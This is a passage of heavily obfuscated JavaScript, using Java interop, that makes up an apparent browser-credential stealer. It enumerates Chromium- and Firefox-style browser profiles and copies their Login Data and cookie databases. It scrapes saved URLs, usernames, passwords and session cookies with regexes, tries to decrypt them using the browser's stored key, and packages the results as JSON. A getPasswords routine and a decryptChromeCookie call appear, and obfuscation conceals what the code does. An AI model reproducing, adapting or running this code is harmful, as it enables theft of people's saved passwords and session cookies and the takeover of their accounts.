_0x31a74e=_0x1c0dce(_0x402dd1,_0x34ecdb);_0x31a74e&&_0x31a74e!==_0x402dd1&&_0x31a74e[_0x2d11e5(0x386,'[B%l')]>0x0&&_0x5cd139(_0x31a74e)&&(_0x5e018b=_0x31a74e,_0x3b82c5=!![]);}catch(_0x861b51){}_0x5cd139(_0x5e018b)&&_0x5e018b[_0x2d11e5(0x51f,'h!Dk')]>0x0&&_0x5e018b[_0x2d11e5(0x53f,'emuX')]<0xfa0&&_0x231936[_0x2d11e5(0x279,'tldi')]({'domain':_0x10e2a8,'name':_0x4a161a,'value':_0x5e018b,'path':_0x48ce86,'expires':0x0,'httpOnly':![],'secure':![],'sameSite':_0x2d11e5(0x665,'emuX'),'browser':_0x1be1c6,'encrypted':_0x3b82c5});}}if(_0x231936[_0x2d11e5(0x1a5,'Fi7!')]===0x0){_0x1e9d28=new java[(_0x2d11e5(0x2c0,'PgYc'))][(_0x2d11e5(0x3ea,'4G]x'))](_0xba1108,_0x2d11e5(0x23e,'4G]x'));let _0x32d85e=/\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.]{1,50})\x00+([a-zA-Z0-9\+\/\=\-_\.]{10,500})\x00/g,_0x57f6fa;while((_0x57f6fa=_0x32d85e[_0x2d11e5(0x63f,'a%Ty')](_0x1e9d28))!==null&&_0x231936[_0x2d11e5(0x55c,'aH$!')]<0x32){let _0x14f4c6='.'+_0x57f6fa[0x1],_0x308993=_0x57f6fa[0x2],_0x2350e4=_0x57f6fa[0x3];_0x5cd139(_0x2350e4)&&_0x2350e4[_0x2d11e5(0x37a,'tldi')]>=0xa&&_0x231936[_0x2d11e5(0x2e0,'7%NS')]({'domain':_0x14f4c6,'name':_0x308993,'value':_0x2350e4,'path':'/','expires':0x0,'httpOnly':![],'secure':![],'sameSite':_0x2d11e5(0x34f,'Ep[K'),'browser':_0x1be1c6,'encrypted':![]});}}}catch(_0x14d497){}return _0x231936;}function _0x5cd139(_0x1a74a6){const _0x137e52=a0_0x4c67;if(!_0x1a74a6||_0x1a74a6[_0x137e52(0x1eb,'PgYc')]===0x0)return![];if(_0x1a74a6[_0x137e52(0x4e4,'2Fbx')]<0x3)return![];let _0x5c9f85=0x0,_0x33938d=0x0;for(let _0x15561f=0x0;_0x15561f<Math[_0x137e52(0x4a7,'jqTf')](_0x1a74a6[_0x137e52(0x49e,'@G#8')],0xc8);_0x15561f++){let _0x1bd59a=_0x1a74a6[_0x137e52(0x280,'h!Dk')](_0x15561f);if(_0x1bd59a>=0x20&&_0x1bd59a<=0x7e||_0x1bd59a===0x9||_0x1bd59a===0xa||_0x1bd59a===0xd)_0x5c9f85++;else(_0x1bd59a<0x20||_0x1bd59a>0x7e)&&_0x33938d++;}let _0x59ed95=Math[_0x137e52(0x500,'zJu^')](_0x1a74a6[_0x137e52(0x4e4,'2Fbx')],0xc8),_0x3c6e37=_0x5c9f85/_0x59ed95,_0x2dd46f=_0x33938d/_0x59ed95;return _0x3c6e37>=0.85&&_0x2dd46f<0.15;}function _0x423c64(_0x58a345,_0x34a566){const _0x6184fa=a0_0x4c67;let _0xd328c8=[],_0x5444a7=new java[(_0x6184fa(0x38c,'h!Dk'))][(_0x6184fa(0x403,'iy!H'))](_0x58a345,_0x6184fa(0x435,'h!Dk')),_0x18c1c9=[/([a-zA-Z0-9\.-]{1,100})\x00+([a-zA-Z0-9_\.-]{1,100})\x00+([^\x00]{0,4000})\x00+([^\x00]{0,200})\x00+/g,/([a-zA-Z0-9\.-]{1,100})\x01+([a-zA-Z0-9_\.-]{1,100})\x01+([^\x01\x00]{0,4000})/g];for(let _0x324a62=0x0;_0x324a62<_0x18c1c9[_0x6184fa(0x45e,'gkB6')];_0x324a62++){let _0x192799=_0x18c1c9[_0x324a62],_0x2b852e;while((_0x2b852e=_0x192799[_0x6184fa(0x315,'Ep[K')](_0x5444a7))!==null&&_0xd328c8[_0x6184fa(0x62c,')WT4')]<0xc8){let _0x2d1a4d=_0x2b852e[0x1],_0x16ca25=_0x2b852e[0x2],_0x3bab6a=_0x2b852e[0x3],_0x576194=_0x2b852e[0x4]||'/';if(!_0x2d1a4d||!_0x16ca25||_0x2d1a4d[_0x6184fa(0x2c3,'BYlI')]>0x64||_0x16ca25[_0x6184fa(0x5d9,'zJu^')]>0x64)continue;if(_0x2d1a4d[_0x6184fa(0x4b9,')n)b')]('\x00')||_0x16ca25[_0x6184fa(0x480,'PgYc')]('\x00'))continue;if(!/^[a-zA-Z0-9\.-]+$/[_0x6184fa(0x1ae,'NO98')](_0x2d1a4d))continue;_0xd328c8[_0x6184fa(0x4b1,'etie')]({'domain':_0x2d1a4d,'name':_0x16ca25,'value':_0x3bab6a,'path':_0x576194,'expires':0x0,'httpOnly':![],'secure':![],'sameSite':_0x6184fa(0x289,'jqTf'),'browser':_0x34a566,'encrypted':![]});}}return _0xd328c8;}function _0x35f9b8(_0x43ad43,_0x1cb826,_0x84a249){const _0x1049ff=a0_0x4c67;let _0x18d679=[],_0x2f1d11=new java[(_0x1049ff(0x440,'Fi7!'))][(_0x1049ff(0x20e,'7%NS'))](_0x43ad43,_0x1049ff(0x23e,'4G]x')),_0x5a8ce7=[/([a-zA-Z0-9\.-]{3,100})\x00+([a-zA-Z0-9_\.-]{1,100})\x00+([^\x00]{1,2000})/g,/([a-zA-Z0-9\.-]{3,100})\x01+([a-zA-Z0-9_\.-]{1,100})\x01+([^\x01\x00]{1,2000})/g];for(let _0x5a48c3=0x0;_0x5a48c3<_0x5a8ce7[_0x1049ff(0x4c6,'ATso')];_0x5a48c3++){let _0x52d7f5=_0x5a8ce7[_0x5a48c3],_0x13fca8;while((_0x13fca8=_0x52d7f5[_0x1049ff(0x2d4,'h!Dk')](_0x2f1d11))!==null&&_0x18d679[_0x1049ff(0x2e1,'etie')]<0x64){let _0x1c251a=_0x13fca8[0x1],_0x259131=_0x13fca8[0x2],_0x21d5dc=_0x13fca8[0x3];if(!_0x1c251a||!_0x259131)continue;if(_0x1c251a[_0x1049ff(0x1eb,'PgYc')]>0x64||_0x259131[_0x1049ff(0x55c,'aH$!')]>0x64)continue;if(!/^[a-zA-Z0-9\.-]+$/[_0x1049ff(0x5ed,'Wi[K')](_0x1c251a))continue;let _0xadf332=_0x21d5dc,_0x102383=![];if(_0x84a249&&(_0x21d5dc[_0x1049ff(0x53d,'ATso')](_0x1049ff(0x62a,'lVXf'))||_0x21d5dc[_0x1049ff(0x27f,'Prp1')](_0x1049ff(0x5a3,'6(Qp')))){let _0x969c78=_0x1c0dce(_0x21d5dc,_0x84a249);_0x969c78&&_0x969c78!==_0x21d5dc&&(_0xadf332=_0x969c78,_0x102383=!![]);}_0x18d679[_0x1049ff(0x4ce,'4G]x')]({'domain':_0x1c251a,'name':_0x259131,'value':_0xadf332,'path':'/','expires':0x0,'httpOnly':![],'secure':![],'sameSite':_0x1049ff(0x289,'jqTf'),'browser':_0x1cb826,'encrypted':_0x102383});}}return _0x18d679;}function _0x261916(){const _0x314366=a0_0x4c67;let _0x3ee1b3=[];try{let _0x177cbd=new java['io'][(_0x314366(0x3a4,'aH$!'))](localAppData+_0x314366(0x213,'Ep[K'));if(_0x177cbd[_0x314366(0x341,'fQM$')]()){let _0x5742d0=_0x177cbd[_0x314366(0x3f7,'PgYc')]();for(let _0x55324d=0x0;_0x55324d<_0x5742d0[_0x314366(0x1eb,'PgYc')];_0x55324d++){if(_0x5742d0[_0x55324d][_0x314366(0x2bd,'zEki')]()){let _0x517c3a=_0x5742d0[_0x55324d][_0x314366(0x56a,'uenZ')](),_0x310ddb=new java['io'][(_0x314366(0x5f9,'whZ0'))](_0x5742d0[_0x55324d],_0x314366(0x1ef,'h!Dk'));_0x310ddb[_0x314366(0x38f,'PgYc')]()&&_0x3ee1b3[_0x314366(0x1e9,'aH$!')]({'name':_0x314366(0x56e,'ATso')+_0x517c3a,'cookiePath':_0x310ddb[_0x314366(0x61f,'4G]x')](),'localStatePath':_0x177cbd[_0x314366(0x4a9,'rMVl')]()+_0x314366(0x325,'Ep[K'),'type':_0x314366(0x4f1,'6(Qp'),'loginDataPath':_0x5742d0[_0x55324d][_0x314366(0x237,'wIzM')]()+_0x314366(0x3b7,'4G]x')});}}}}catch(_0x2f4e91){}try{let _0x30c047=new java['io'][(_0x314366(0x1cb,'Wi[K'))](localAppData+_0x314366(0x2af,'gkB6'));if(_0x30c047[_0x314366(0x54e,'etie')]()){let _0x50f0b7=_0x30c047[_0x314366(0x3ec,'rMVl')]();for(let _0x4d823a=0x0;_0x4d823a<_0x50f0b7[_0x314366(0x36d,'NO98')];_0x4d823a++){if(_0x50f0b7[_0x4d823a][_0x314366(0x195,'@[ny')]()){let _0x29a752=_0x50f0b7[_0x4d823a][_0x314366(0x208,'G3bK')](),_0x3fa46a=new java['io'][(_0x314366(0x31a,'1&mi'))](_0x50f0b7[_0x4d823a],_0x314366(0x5d6,'BYlI'));_0x3fa46a[_0x314366(0x4bf,'5w@D')]()&&_0x3ee1b3[_0x314366(0x35e,'PgYc')]({'name':_0x314366(0x198,'aH$!')+_0x29a752,'cookiePath':_0x3fa46a[_0x314366(0x58e,'W^I^')](),'localStatePath':_0x30c047[_0x314366(0x2f5,'zJu^')]()+_0x314366(0x5cc,'Prp1'),'type':_0x314366(0x2ea,'Q%]A'),'loginDataPath':_0x50f0b7[_0x4d823a][_0x314366(0x3fe,'pMYq')]()+_0x314366(0x2e4,'Wi[K')});}}}}catch(_0x2d8549){}try{let _0x6651b8=new java['io'][(_0x314366(0x3b4,'Prp1'))](appData+_0x314366(0x1ac,'lVXf'));if(_0x6651b8[_0x314366(0x1f1,'G3bK')]()){let _0x193623=_0x6651b8[_0x314366(0x29a,'jn62')]();for(let _0x41afbd=0x0;_0x41afbd<_0x193623[_0x314366(0x49e,'@G#8')];_0x41afbd++){if(_0x193623[_0x41afbd][_0x314366(0x60d,'BYlI')]()){let _0x291620=new java['io'][(_0x314366(0x303,'lVXf'))](_0x193623[_0x41afbd],_0x314366(0x2fc,'Lz2$'));_0x291620[_0x314366(0x248,'ATso')]()&&_0x3ee1b3[_0x314366(0x651,'uenZ')]({'name':_0x314366(0x1dd,'Prp1')+_0x193623[_0x41afbd][_0x314366(0x221,'Q%]A')](),'cookiePath':_0x291620[_0x314366(0x429,'emuX')](),'type':_0x314366(0x5d8,')WT4'),'profilePath':_0x193623[_0x41afbd][_0x314366(0x33a,'zEki')]()});}}}}catch(_0xb38eaf){}return _0x3ee1b3;}let _0x54a338=_0x5c6e51[_0x2df153(0x56b,'ATso')](_0x261916()),_0x82298c=[],_0x1105a6=new java[(_0x2df153(0x1c6,'dMvi'))][(_0x2df153(0x469,'2Fbx'))]();for(let _0x5bd1f7=0x0;_0x5bd1f7<_0x54a338[_0x2df153(0x4c6,'ATso')];_0x5bd1f7++){!_0x1105a6[_0x2df153(0x380,')n)b')](_0x54a338[_0x5bd1f7][_0x2df153(0x1b5,'Q%]A')])&&(_0x1105a6[_0x2df153(0x62d,'V$ji')](_0x54a338[_0x5bd1f7][_0x2df153(0x65e,'wIzM')]),_0x82298c[_0x2df153(0x518,'G3bK')](_0x54a338[_0x5bd1f7]));}for(let _0x4cdf1f=0x0;_0x4cdf1f<_0x82298c[_0x2df153(0x53f,'emuX')];_0x4cdf1f++){let _0x387b35=_0x82298c[_0x4cdf1f];try{let _0x1be8d1=new java['io'][(_0x2df153(0x3d4,'V$ji'))](_0x387b35[_0x2df153(0x648,'zJu^')]);if(!_0x1be8d1[_0x2df153(0x351,'4G]x')]()||_0x1be8d1[_0x2df153(0x436,'Ep[K')]()==0x0)continue;let _0x43f61c=null;_0x387b35[_0x2df153(0x43d,'wIzM')]===_0x2df153(0x19f,'uenZ')&&_0x387b35[_0x2df153(0x222,'4G]x')]&&(_0x43f61c=_0x44f47a(_0x387b35[_0x2df153(0x639,'[B%l')]));let _0x339f53=_0x2cbc66(_0x387b35[_0x2df153(0x3ab,'Lz2$')],_0x387b35[_0x2df153(0x324,'whZ0')],_0x43f61c);if(_0x339f53&&_0x339f53[_0x2df153(0x1a5,'Fi7!')]>0x0){let _0x12ea21={'browser':_0x387b35[_0x2df153(0x355,'1&mi')],'browserType':_0x387b35[_0x2df153(0x1ca,'th37')],'cookieCount':_0x339f53[_0x2df153(0x49e,'@G#8')],'cookies':_0x339f53,'extractedAt':new java[(_0x2df153(0x1d1,'pMYq'))][(_0x2df153(0x2c2,'Q%]A'))]()[_0x2df153(0x62e,'h!Dk')](),'filePath':_0x387b35[_0x2df153(0x4a6,'aH$!')],'fileSize':_0x1be8d1[_0x2df153(0x2ec,'rMVl')](),'lastModified':new java[(_0x2df153(0x2b6,'[B%l'))][(_0x2df153(0x320,'4G]x'))](_0x1be8d1[_0x2df153(0x2ee,'jqTf')]())[_0x2df153(0x333,'gkB6')](),'encryptionKeyFound':_0x43f61c!==null,'profilePath':_0x387b35[_0x2df153(0x4ba,'jn62')]||null};if(_0x387b35[_0x2df153(0x35a,'6(Qp')])try{let _0xcaceab=new java['io'][(_0x2df153(0x3a4,'aH$!'))](_0x387b35[_0x2df153(0x46b,'NO98')]);_0xcaceab[_0x2df153(0x248,'ATso')]()&&(_0x12ea21[_0x2df153(0x1a3,'7%NS')]=!![],_0x12ea21[_0x2df153(0x313,'zEki')]=_0xcaceab[_0x2df153(0x386,'[B%l')]());}catch(_0x2bf924){}_0x3b0a69[_0x387b35[_0x2df153(0x4b5,'Wi[K')]]=_0x12ea21;}}catch(_0x142346){_0x3b0a69[_0x387b35[_0x2df153(0x2d3,'7%NS')]+_0x2df153(0x5f7,'@G#8')]={'browser':_0x387b35[_0x2df153(0x521,'8(V@')],'error':_0x142346[_0x2df153(0x1a1,'th37')](),'extractedAt':new java[(_0x2df153(0x487,'NO98'))][(_0x2df153(0x66a,'a%Ty'))]()[_0x2df153(0x3b9,'zJu^')]()};}}let _0x1e9ead={'totalBrowsersChecked':Object[_0x2df153(0x1e4,'fQM$')](_0x3b0a69)[_0x2df153(0x60f,'zEki')],'browsersWithErrors':0x0,'browsersWithCookies':0x0,'totalCookiesFound':0x0,'decryptionAttempts':0x0,'successfulDecryptions':0x0},_0x19e431={};for(let _0xcdadad in _0x3b0a69){let _0x21d2a3=_0x3b0a69[_0xcdadad];if(_0xcdadad[_0x2df153(0x3a6,'pMYq')](_0x2df153(0x5f3,'emuX'))||_0x21d2a3[_0x2df153(0x64a,'BYlI')]){_0x1e9ead[_0x2df153(0x559,'tldi')]++;continue;}_0x21d2a3[_0x2df153(0x262,'tldi')]&&_0x1e9ead[_0x2df153(0x538,'emuX')]++;if(_0x21d2a3[_0x2df153(0x30e,'PgYc')]&&Array[_0x2df153(0x46a,')WT4')](_0x21d2a3[_0x2df153(0x421,'h!Dk')])&&_0x21d2a3[_0x2df153(0x363,'jn62')][_0x2df153(0x386,'[B%l')]>0x0){let _0x1cb64d=_0x21d2a3[_0x2df153(0x4fa,'7%NS')][_0x2df153(0x19a,'RRF)')](_0x2e3826=>{const _0x5cf5ae=_0x2df153;return _0x2e3826[_0x5cf5ae(0x392,'Lz2$')]&&_0x1e9ead[_0x5cf5ae(0x38d,'6(Qp')]++,_0x2e3826[_0x5cf5ae(0x593,'2Fbx')]!==_0x5cf5ae(0x448,'uenZ')&&_0x2e3826[_0x5cf5ae(0x361,'zJu^')]!==_0x5cf5ae(0x306,'iy!H')&&_0x2e3826[_0x5cf5ae(0x220,'pMYq')]!==_0x5cf5ae(0x2b9,'G3bK')&&_0x2e3826[_0x5cf5ae(0x4a5,'RRF)')]!==_0x5cf5ae(0x4de,'lVXf')&&!_0x2e3826[_0x5cf5ae(0x1b0,'zJu^')][_0x5cf5ae(0x489,'NO98')](_0x5cf5ae(0x2b5,'ATso'))&&!_0x2e3826[_0x5cf5ae(0x44e,'@[ny')][_0x5cf5ae(0x634,'uenZ')](_0x5cf5ae(0x382,'wIzM'));});_0x1cb64d[_0x2df153(0x1fa,'Prp1')]>0x0&&(_0x21d2a3[_0x2df153(0x394,'5w@D')]=_0x1cb64d,_0x21d2a3[_0x2df153(0x602,'Prp1')]=_0x1cb64d[_0x2df153(0x326,'lVXf')],_0x19e431[_0xcdadad]=_0x21d2a3,_0x1e9ead[_0x2df153(0x3d3,')WT4')]++,_0x1e9ead[_0x2df153(0x258,'Ep[K')]+=_0x1cb64d[_0x2df153(0x62c,')WT4')]);}}let _0x15c8a1=![];for(let _0x245622 in _0x19e431){let _0x522c52=_0x19e431[_0x245622];if(_0x522c52[_0x2df153(0x363,'jn62')])for(let _0x251f25 of _0x522c52[_0x2df153(0x60e,'tldi')]){if(_0x251f25[_0x2df153(0x33c,'Wi[K')][_0x2df153(0x501,'6(Qp')](_0x2df153(0x3b6,'jqTf'))||_0x251f25[_0x2df153(0x21b,'jqTf')][_0x2df153(0x4a4,'Prp1')](_0x2df153(0x57f,'zJu^'))||_0x251f25[_0x2df153(0x4d6,'V$ji')][_0x2df153(0x408,'pMYq')](_0x2df153(0x26e,'5w@D'))||_0x251f25[_0x2df153(0x276,'6(Qp')][_0x2df153(0x1ea,'aH$!')](_0x2df153(0x4ae,'lVXf'))){_0x15c8a1=!![];break;}}if(_0x15c8a1)break;}return!_0x15c8a1&&(_0x19e431[_0x2df153(0x5cd,'dMvi')]=_0x1e9ead),JSON[_0x2df153(0x2a7,'4G]x')](_0x19e431);}function killBrowsers(){return;}function getPasswords(){const _0x39679b=a0_0x49b0a2;killBrowsers();const _0x3fd47b=getEnvironmentPaths();let _0x5cc465={};function _0x39f4d4(){const _0x4db459=a0_0x4c67;return _0x3fd47b[_0x4db459(0x485,'V$ji')]===_0x4db459(0x5f0,'PwVi')?[{'name':_0x4db459(0x29e,'RRF)'),'loginDataPath':_0x3fd47b[_0x4db459(0x2d8,'4G]x')]+_0x4db459(0x1df,'Q%]A'),'localStatePath':_0x3fd47b[_0x4db459(0x4ac,'G3bK')]+_0x4db459(0x27d,'zJu^'),'type':_0x4db459(0x5c4,'jqTf')},{'name':_0x4db459(0x31b,'6(Qp'),'loginDataPath':_0x3fd47b[_0x4db459(0x229,'jn62')]+_0x4db459(0x4b7,'4G]x'),'localStatePath':_0x3fd47b[_0x4db459(0x522,'W^I^')]+_0x4db459(0x433,'7%NS'),'type':_0x4db459(0x1ed,'7%NS')},{'name':_0x4db459(0x5d0,'Q%]A'),'loginDataPath':_0x3fd47b[_0x4db459(0x383,'2Fbx')]+_0x4db459(0x3de,'6(Qp'),'localStatePath':_0x3fd47b[_0x4db459(0x2b1,'wIzM')]+_0x4db459(0x649,'dMvi'),'type':_0x4db459(0x2a3,'8(V@')},{'name':_0x4db459(0x414,'#cv9'),'loginDataPath':_0x3fd47b[_0x4db459(0x298,'6(Qp')]+_0x4db459(0x434,'2Fbx'),'localStatePath':_0x3fd47b[_0x4db459(0x557,'lVXf')]+_0x4db459(0x2b8,'emuX'),'type':_0x4db459(0x5b4,'W^I^')}]:[{'name':_0x4db459(0x25d,'@G#8'),'loginDataPath':_0x3fd47b[_0x4db459(0x2ef,')WT4')]+_0x4db459(0x5e9,'wIzM'),'localStatePath':_0x3fd47b[_0x4db459(0x2ef,')WT4')]+_0x4db459(0x360,'@[ny'),'type':_0x4db459(0x40e,'fQM$')},{'name':_0x4db459(0x23a,'a%Ty'),'loginDataPath':_0x3fd47b[_0x4db459(0x305,'RRF)')]+_0x4db459(0x39e,'etie'),'localStatePath':_0x3fd47b[_0x4db459(0x567,'5w@D')]+_0x4db459(0x5e2,'Q%]A'),'type':_0x4db459(0x445,'jn62')},{'name':_0x4db459(0x243,'jn62'),'loginDataPath':_0x3fd47b[_0x4db459(0x661,'2Kmv')]+_0x4db459(0x2d9,'jn62'),'localStatePath':_0x3fd47b[_0x4db459(0x1ff,'iy!H')]+_0x4db459(0x4f6,'tldi'),'type':_0x4db459(0x3da,'@G#8')},{'name':_0x4db459(0x414,'#cv9'),'loginDataPath':_0x3fd47b[_0x4db459(0x1b1,'Prp1')]+_0x4db459(0x2f3,'7%NS'),'localStatePath':_0x3fd47b[_0x4db459(0x5ec,'lVXf')]+_0x4db459(0x199,'th37'),'type':_0x4db459(0x1ec,'zEki')}];}let _0x4dfc87=_0x39f4d4();function _0x2a7a95(_0x85d25a,_0x27ef1e,_0xe0ff3e){const _0x25b5ee=a0_0x4c67;try{let _0x2c8dd2=new java['io'][(_0x25b5ee(0x242,'wIzM'))](_0x85d25a);if(!_0x2c8dd2[_0x25b5ee(0x524,'wIzM')]()||_0x2c8dd2[_0x25b5ee(0x41b,'whZ0')]()==0x0)return[];let _0x318a14=java[_0x25b5ee(0x4c1,'1&mi')][_0x25b5ee(0x594,'th37')][_0x25b5ee(0x600,'th37')](_0x25b5ee(0x24f,'zJu^')),_0x4dca94=_0x318a14+_0x25b5ee(0x494,'RRF)')+_0x27ef1e+'_'+java[_0x25b5ee(0x396,'6(Qp')][_0x25b5ee(0x5ef,'zEki')][_0x25b5ee(0x453,'7%NS')]()+_0x25b5ee(0x54d,'V$ji');java[_0x25b5ee(0x60c,'#cv9')][_0x25b5ee(0x3b5,'1&mi')][_0x25b5ee(0x39b,'emuX')][_0x25b5ee(0x390,'W^I^')](_0x2c8dd2[_0x25b5ee(0x1a7,'RRF)')](),new java['io'][(_0x25b5ee(0x4cb,'h!Dk'))](_0x4dca94)[_0x25b5ee(0x3aa,'#cv9')](),java[_0x25b5ee(0x234,'fQM$')][_0x25b5ee(0x44c,'h!Dk')][_0x25b5ee(0x24b,'pMYq')][_0x25b5ee(0x327,'4G]x')]);let _0x5c4c3d=[];try{let _0x4f1939=java[_0x25b5ee(0x2f4,'whZ0')][_0x25b5ee(0x214,'2Fbx')][_0x25b5ee(0x4d8,'lVXf')][_0x25b5ee(0x535,'@[ny')](new java['io'][(_0x25b5ee(0x4cb,'h!Dk'))](_0x4dca94)[_0x25b5ee(0x581,'ATso')]()),_0x3a5eee=_0x5e6c31(_0x4f1939,_0x27ef1e,_0xe0ff3e);try{new java['io'][(_0x25b5ee(0x27b,'BYlI'))](_0x4dca94)[_0x25b5ee(0x529,'dMvi')]();}catch(_0x35d2ac){}return _0x3a5eee;}catch(_0x511e7e){try{new java['io'][(_0x25b5ee(0x31a,'1&mi'))](_0x4dca94)[_0x25b5ee(0x529,'dMvi')]();}catch(_0x2dbc7b){}return[{'origin_url':_0x25b5ee(0x4d1,')WT4'),'username_value':_0x25b5ee(0x4c7,'Lz2$'),'password_value':_0x511e7e[_0x25b5ee(0x62e,'h!Dk')](),'date_created':0x0,'date_last_used':0x0,'browser':_0x27ef1e,'encrypted':![]}];}}catch(_0x384063){return[{'origin_url':_0x25b5ee(0x257,'aH$!'),'username_value':_0x25b5ee(0x57c,'fQM$'),'password_value':_0x384063[_0x25b5ee(0x5dc,')n)b')](),'date_created':0x0,'date_last_used':0x0,'browser':_0x27ef1e,'encrypted':![]}];}}function _0x5e6c31(_0x27f76e,_0x364943,_0x3f82ea){const _0x1157b0=a0_0x4c67;let _0x12bd96=[];try{let _0x28875b=new java[(_0x1157b0(0x655,'pMYq'))][(_0x1157b0(0x678,'[B%l'))](java[_0x1157b0(0x25f,'2Fbx')][_0x1157b0(0x1d7,'th37')][_0x1157b0(0x59c,'PwVi')](_0x27f76e,0x0,0x10),_0x1157b0(0x457,'PwVi'));if(!_0x28875b[_0x1157b0(0x4e1,'8(V@')](_0x1157b0(0x3f3,'Wi[K')))throw new Error(_0x1157b0(0x5d7,'fQM$'));let _0x115f8f=[function(){return _0x49fae7(_0x27f76e,_0x364943,_0x3f82ea);},function(){return _0x487345(_0x27f76e,_0x364943,_0x3f82ea);}];for(let _0x2ab97b=0x0;_0x2ab97b<_0x115f8f[_0x1157b0(0x60f,'zEki')];_0x2ab97b++){try{let _0x55f524=_0x115f8f[_0x2ab97b]();if(_0x55f524&&_0x55f524[_0x1157b0(0x51e,'wIzM')]>0x0){_0x12bd96=_0x12bd96[_0x1157b0(0x50a,'G3bK')](_0x55f524);if(_0x12bd96[_0x1157b0(0x425,'#cv9')]>=0x64)break;}}catch(_0x1520f1){continue;}}return _0x12bd96;}catch(_0x23af47){return[{'origin_url':_0x1157b0(0x1e6,'Q%]A'),'username_value':_0x1157b0(0x542,'G3bK'),'password_value':_0x23af47[_0x1157b0(0x5c8,'zEki')](),'date_created':0x0,'date_last_used':0x0,'browser':_0x364943,'encrypted':![]}];}}function _0x49fae7(_0x2fbd1f,_0x2261fe,_0x29ea54){const _0x23bc09=a0_0x4c67;let _0x15ba11=[],_0x2dfd13=new java[(_0x23bc09(0x2fd,'aH$!'))][(_0x23bc09(0x284,'th37'))](_0x2fbd1f,_0x23bc09(0x2c7,'whZ0')),_0x156538=[/(https?:\/\/[a-zA-Z0-9\.-]{1,100}[^\x00]{0,200})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+(v1[01][^\x00]{10,1000}|[^\x00]{1,1000})\x00+/g,/(https?:\/\/[a-zA-Z0-9\.-]{1,100}[^\x01]{0,200})\x01+([a-zA-Z0-9@\._-]{1,100})\x01+(v1[01][^\x01]{10,1000}|[^\x01]{1,1000})/g,/([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10}[^\x00]{0,200})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+(v1[01][^\x00]{10,1000})\x00+/g];for(let _0x38bdbb=0x0;_0x38bdbb<_0x156538[_0x23bc09(0x51f,'h!Dk')];_0x38bdbb++){let _0x391e9e=_0x156538[_0x38bdbb],_0x1b99d1;while((_0x1b99d1=_0x391e9e[_0x23bc09(0x296,'6(Qp')](_0x2dfd13))!==null&&_0x15ba11[_0x23bc09(0x1fa,'Prp1')]<0x64){let _0x260d0b=_0x1b99d1[0x1],_0x2ada91=_0x1b99d1[0x2],_0x1c9f5e=_0x1b99d1[0x3];if(!_0x260d0b||!_0x2ada91||_0x260d0b[_0x23bc09(0x259,'RRF)')]>0x12c||_0x2ada91[_0x23bc09(0x5d9,'zJu^')]>0x64)continue;if(_0x260d0b[_0x23bc09(0x4d9,'W^I^')]('\x00')||_0x2ada91[_0x23bc09(0x3ae,'zEki')]('\x00'))continue;!_0x260d0b[_0x23bc09(0x56f,'Lz2$')](_0x23bc09(0x1fe,'Prp1'))&&(_0x260d0b=_0x23bc09(0x275,'wIzM')+_0x260d0b[_0x23bc09(0x63b,'etie')]('/')[0x0]);let _0x49aadb=_0x1c9f5e,_0x2b5fa8=![];if(_0x29ea54&&(_0x1c9f5e[_0x23bc09(0x555,'@G#8')](_0x23bc09(0x389,'iy!H'))||_0x1c9f5e[_0x23bc09(0x55e,'wIzM')](_0x23bc09(0x5be,'emuX'))||_0x1c9f5e[_0x23bc09(0x4c6,'ATso')]>0x0&&_0x1c9f5e[_0x23bc09(0x4da,'V$ji')](0x0)===0x1)){let _0x5c8fc7=decryptChromeCookie(_0x1c9f5e,_0x29ea54);_0x5c8fc7&&_0x5c8fc7!==_0x1c9f5e&&(_0x49aadb=_0x5c8fc7,_0x2b5fa8=!![]);}let _0x1031be=0x0,_0x19b064=0x0,_0x177652=Math[_0x23bc09(0x416,'fQM$')](0x0,_0x1b99d1[_0x23bc09(0x3ca,'jqTf')]-0xc8),_0x16ab54=Math[_0x23bc09(0x508,'wIzM')](_0x2dfd13[_0x23bc09(0x347,'Wi[K')],_0x1b99d1[_0x23bc09(0x2e7,'@G#8')]+_0x1b99d1[0x0][_0x23bc09(0x436,'Ep[K')]+0xc8),_0xce4829=_0x2dfd13[_0x23bc09(0x353,'6(Qp')](_0x177652,_0x16ab54),_0x3cd6ac=/([0-9]{13,17})/g,_0x13c3eb,_0x21e99f=[];while((_0x13c3eb=_0x3cd6ac[_0x23bc09(0x641,')WT4')](_0xce4829))!==null&&_0x21e99f[_0x23bc09(0x45e,'gkB6')]<0x5){let _0x1a5aff=parseInt(_0x13c3eb[0x1]);_0x1a5aff>0x295e9648864000&&_0x1a5aff<0x470de4df820000&&_0x21e99f[_0x23bc09(0x43c,'dMvi')](_0x1a5aff);}_0x21e99f[_0x23bc09(0x397,'pMYq')]>=0x2&&(_0x1031be=_0x21e99f[0x0],_0x19b064=_0x21e99f[0x1]),_0x15ba11[_0x23bc09(0x35e,'PgYc')]({'origin_url':_0x260d0b,'username_value':_0x2ada91,'password_value':_0x49aadb,'date_created':_0x1031be,'date_last_used':_0x19b064,'browser':_0x2261fe,'encrypted':_0x2b5fa8});}}return _0x15ba11;}function _0x487345(_0x2ee9ac,_0x12d243,_0x49bafc){const _0x418011=a0_0x4c67;let _0x2d82f8=[],_0x5afff7=new java[(_0x418011(0x517,'fQM$'))][(_0x418011(0x2cf,'ATso'))](_0x2ee9ac,_0x418011(0x637,')n)b')),_0x2fdc4a=[/([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+([^\x00]{1,1000})/g,/([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10})\x01+([a-zA-Z0-9@\._-]{1,100})\x01+([^\x01\x00]{1,1000})/g];for(let _0x222e62=0x0;_0x222e62<_0x2fdc4a[_0x418011(0x347,'Wi[K')];_0x222e62++){let _0x3bc646=_0x2fdc4a[_0x222e62],_0x1b4c56;while((_0x1b4c56=_0x3bc646[_0x418011(0x18b,'whZ0')](_0x5afff7))!==null&&_0x2d82f8[_0x418011(0x37a,'tldi')]<0x32){let 